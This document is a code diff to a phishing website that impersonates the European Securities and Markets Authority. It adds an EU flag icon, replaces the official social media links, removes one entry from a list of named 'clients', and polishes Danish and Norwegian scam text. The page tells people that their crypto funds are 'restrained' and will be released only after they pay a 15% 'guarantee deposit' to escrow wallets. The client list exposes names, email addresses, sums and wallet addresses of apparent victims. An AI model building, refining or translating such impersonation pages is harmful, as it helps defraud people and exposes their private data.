@@ -382,6 +382,13 @@ input[type="text"], input[type="email"], select {
   gap: 8px;
 }
 
+.eu-flag-icon {
+  width: 22px;
+  height: 15px;
+  display: inline-block;
+  vertical-align: middle;
+}
+
 .footer-links {
   display: grid;
   grid-template-columns: repeat(3, minmax(140px, auto));
@@ -701,7 +708,35 @@ input[type="text"], input[type="email"], select {
       </a>
       <div class="eu-banner">
         <span>ESMA is an authority of the European Union</span>
-        <span>★</span>
+        
+        <!-- EU Flag SVG Replacement -->
+        <svg class="eu-flag-icon" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 270 180" aria-label="EU Flag">
+          <rect width="270" height="180" fill="#003399"/>
+          <g id="star">
+            <g id="half">
+              <path id="point" d="M0-1V0h1" transform="rotate(18,0,-1)" fill="#ffcc00"/>
+              <use xlink:href="#point" transform="scale(-1,1)"/>
+            </g>
+            <use xlink:href="#half" transform="rotate(72)"/>
+            <use xlink:href="#half" transform="rotate(144)"/>
+            <use xlink:href="#half" transform="rotate(-144)"/>
+            <use xlink:href="#half" transform="rotate(-72)"/>
+          </g>
+          <g transform="translate(135,90) scale(9)">
+            <use xlink:href="#star" y="-6"/>
+            <use xlink:href="#star" transform="rotate(30)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(60)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(90)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(120)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(150)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(180)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(210)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(240)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(270)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(300)" y="-6"/>
+            <use xlink:href="#star" transform="rotate(330)" y="-6"/>
+          </g>
+        </svg>
       </div>
     </div>
 
@@ -719,10 +754,10 @@ input[type="text"], input[type="email"], select {
     <div class="footer-social">
       <h4 class="social-heading">Social Media</h4>
       <div class="social-icons">
-        <a href="https://www.linkedin.com/company/european-securities-and-markets-authority-esma/" target="_blank" aria-label="LinkedIn"><i class="fa-brands fa-linkedin"></i></a>
-        <a href="https://instagram.com/esmacomms/" target="_blank" aria-label="Instagram"><i class="fa-brands fa-square-instagram"></i></a>
-        <a href="https://twitter.com/ESMAComms" target="_blank" aria-label="X (Twitter)"><i class="fa-brands fa-square-x-twitter"></i></a>
-        <a href="https://www.youtube.com/channel/UCe5tFtIMPE5BbFGdqT330WQ" target="_blank" aria-label="YouTube"><i class="fa-brands fa-square-youtube"></i></a>
+        <a href="https://linkedin.com" target="_blank" aria-label="LinkedIn"><i class="fa-brands fa-linkedin"></i></a>
+        <a href="https://instagram.com" target="_blank" aria-label="Instagram"><i class="fa-brands fa-square-instagram"></i></a>
+        <a href="https://x.com" target="_blank" aria-label="X (Twitter)"><i class="fa-brands fa-square-x-twitter"></i></a>
+        <a href="https://youtube.com" target="_blank" aria-label="YouTube"><i class="fa-brands fa-square-youtube"></i></a>
       </div>
     </div>
 
@@ -775,17 +810,6 @@ const clients = {
     restrainedAmount: 11960.03,
     guaranteeRate: 0.15, // 15.00%
     wallet: "0x1AAA3649B477abf82F1a470f8093A2ce51DAfcf8"
-  },
-  "ealduja1@exseed.ed.ac.uk": {
-    name: "Emad Abdol Sahib Al Dujaili",
-    email: "ealduja1@exseed.ed.ac.uk",
-    ref: "EU-MICA-6612984-10",
-    date: "February 8th, 2025",
-    currency: "GBP",
-    currencySymbol: "£",
-    restrainedAmount: 59784.15,
-    guaranteeRate: 0.15, // 15.00%
-    wallet: "0x3bc3D6BA5f900Ba9eE753fb23d24Dc2d95eD4F92"
   },
   "supermom.kitzberg@gmail.com": {
     name: "Annette Kitzberg",
@@ -950,7 +974,7 @@ const i18n = {
     errCheck: "Markér venligst afkrydsningsfeltet.",
     errSelectAsset: "Vælg et aktiv.",
     errMaint: "Netværksvedligeholdelse på {c}. Brug venligst Ethereum (ETH) for øjeblikkelig automatisk behandling.",
-    msgCopied: "Escrow-adresse kopieret til udklipsholder."
+    msgCopied: "Escrow-adresse kopiert til udklipsholder."
   },
   DE: {
     topBanner: "Offizielle Datenbank der Europäischen Wertpapier- und Marktaufsichtsbehörde",
@@ -1448,7 +1472,7 @@ const i18n = {
     modalText: "Jeg anerkner rammeverket <strong>MiCA (Forordning EU 2023/1114)</strong> og forstår at frigivelse av midler strengt er betinget av verifisering av det obligatoriske garantidepositumet.",
     btnModalProceed: "GÅ TIL VERIFISERING",
     dispatchModalTitle: "Innskuddssending Registrert",
-    dispatchModalText: "Vennligst send ditt <strong>Betalingsbevis</strong> (Transaktionshash / Kvittering) direkte til din dedikerte Financial Compliance Officer for å legge til rette for umiddelbar verifisering og sertifikatutstedelse.",
+    dispatchModalText: "Vennligst send ditt <strong>Betalingsbevis</strong> (Transaksjonshash / Kvittering) direkte til din dedikerte Financial Compliance Officer for å legge til rette for umiddelbar verifisering og sertifikatutstedelse.",
     btnDispatchClose: "BEKREFT OG LUKK",
     ftrCareers: "Karrierer",
     ftrContact: "Kontakt & Hjelp",
